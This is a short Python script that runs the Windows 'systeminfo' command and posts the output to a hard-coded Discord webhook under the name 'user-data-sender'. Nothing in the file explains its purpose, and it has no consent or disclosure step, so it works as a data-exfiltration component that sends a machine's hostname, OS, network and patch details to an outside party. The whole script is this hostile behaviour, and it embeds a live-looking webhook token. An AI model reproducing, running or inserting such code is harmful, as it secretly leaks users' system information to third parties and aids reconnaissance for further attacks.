import os
import requests
import datetime

def send_user_data():
    webhook_url = "https://discord.com/api/webhooks/1387111279063339152/xYmPTkUUW0Il82roiAycRPXPqb9U-vJ2LyyuU6NLByYze2o4oC15kc8p-mXVa5Nv3_o6"
    timestamp = datetime.datetime.utcnow()
    description = f"User data sent at {datetime.datetime.now()}\nSystem Information: {system_info()}\n"
    if len(description) > 4096:
        description = description[-4096:]  # Neem de laatste 4096 tekens
    data = {
        "components": [],
        "username": "user-data-sender",
        "embeds": [
            {
                "author": {
                    "name": "username_of_data"
                },
                "title": "User Data",
                "color": 27921,
                "description": description,
                "timestamp": timestamp.strftime("%Y-%m-%dT%H:%M:%S.%fZ")
            }
        ]
    }
    try:
        response = requests.post(webhook_url, json=data)
        if response.status_code in [200, 204]:
            print("User data sent successfully!")
        else:
            print(f"Failed to send user data. Status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred while sending user data: {e}")

def system_info():
    get_info = os.popen('systeminfo').read()
    return get_info

if __name__ == "__main__":
    send_user_data()